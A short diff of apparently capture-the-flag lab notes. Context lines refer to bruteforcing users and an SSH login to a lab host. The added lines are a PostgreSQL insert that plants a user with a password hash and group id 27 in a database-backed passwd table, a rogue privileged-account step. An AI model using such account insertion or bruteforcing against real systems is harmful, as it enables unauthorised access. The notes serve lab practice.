@@ -105,3 +105,6 @@ You will get some users after running the script, run a bruteforce attack on one
 
 ssh -p 22022 sunny@10.10.10.76
 *****************************************************************************************************************************
+Postgresql Statement to insert data in a database:
+
+insert into passwd_table (username, passwd, gid, homedir) values ('sud0xdfer', '$1$wV7CPbj9$59kAklYgquXe5TuJYIT591', 27, '/home/penelope');
